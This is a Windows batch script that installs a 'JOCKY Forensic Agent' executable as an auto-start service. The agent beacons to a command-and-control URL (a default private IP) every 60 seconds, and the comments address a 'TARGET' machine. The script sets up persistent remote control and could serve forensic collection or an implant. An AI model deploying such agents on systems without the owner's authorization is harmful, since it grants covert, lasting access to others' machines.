@echo off
REM install_service.bat -- Install JOCKY agent as Windows service
REM Run as Admin on TARGET machine

set C2_URL=%1
if "%C2_URL%"=="" set C2_URL=http://192.168.1.100:8000

echo [*] Installing JOCKY Agent as Windows service
echo [*] C2: %C2_URL%

sc create JockyForensicAgent ^
    binPath= "\"%~dp0jocky_agent.exe\" --c2 %C2_URL% --interval 60" ^
    DisplayName= "JOCKY Forensic Agent" ^
    start= auto ^
    type= own

if %ERRORLEVEL% EQU 0 (
    sc start JockyForensicAgent
    echo [+] Service installed and started
    echo [+] Check: sc query JockyForensicAgent
) else (
    echo [-] Service install failed: %ERRORLEVEL%
)
